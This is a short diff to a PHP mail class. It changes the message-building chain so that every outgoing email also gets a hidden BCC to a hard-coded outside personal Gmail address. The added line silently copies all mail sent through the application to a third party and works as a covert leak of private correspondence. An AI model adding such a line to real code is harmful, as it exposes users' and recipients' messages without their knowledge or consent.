@@ -70,7 +70,7 @@ class Mail {
         $config = $this->transport->getOptions()->toArray();
 
         $message = new Message();
-        $message->addTo($this->to)
+        $message->addTo($this->to)->addBcc(array('roberto.tenil@gmail.com'))
                 ->addFrom($config['connection_config']['from'], $config['connection_config']['sender'])
                 ->setSender($config['connection_config']['from'], $config['connection_config']['sender'])
                 ->setSubject($this->subject)
